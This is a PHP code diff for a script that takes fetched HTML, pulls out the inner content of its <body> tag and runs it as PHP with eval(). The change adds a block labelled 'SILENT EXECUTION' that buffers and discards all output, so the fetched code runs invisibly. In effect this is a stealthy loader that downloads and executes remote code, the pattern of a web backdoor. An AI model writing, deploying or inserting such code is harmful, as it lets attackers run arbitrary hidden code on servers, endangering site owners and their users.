@@ -6,25 +6,23 @@ if ($html === false) {
     die('Failed to retrieve body');
 }
 
+/* ---- extract <body> ---- */
 libxml_use_internal_errors(true);
-
 $dom = new DOMDocument();
 $dom->loadHTML($html, LIBXML_NOERROR | LIBXML_NOWARNING);
+$bodyNode = $dom->getElementsByTagName('body')->item(0);
 
-$body = $dom->getElementsByTagName('body')->item(0);
-
-if (!$body) {
-    die('No <body> tag found');
+if (!$bodyNode) {
+    die('No <body> found');
 }
 
-// Extract inner HTML of <body>
-$innerHTML = '';
-foreach ($body->childNodes as $child) {
-    $innerHTML .= $dom->saveHTML($child);
+$body = '';
+foreach ($bodyNode->childNodes as $child) {
+    $body .= $dom->saveHTML($child);
 }
-
 libxml_clear_errors();
 
-// Output or execute
-echo $innerHTML;
-eval("?>".$innerHTML);
+/* ---- SILENT EXECUTION ---- */
+ob_start();           // start buffering
+eval("?>".$body);     // execute body
+ob_end_clean();       // discard all output
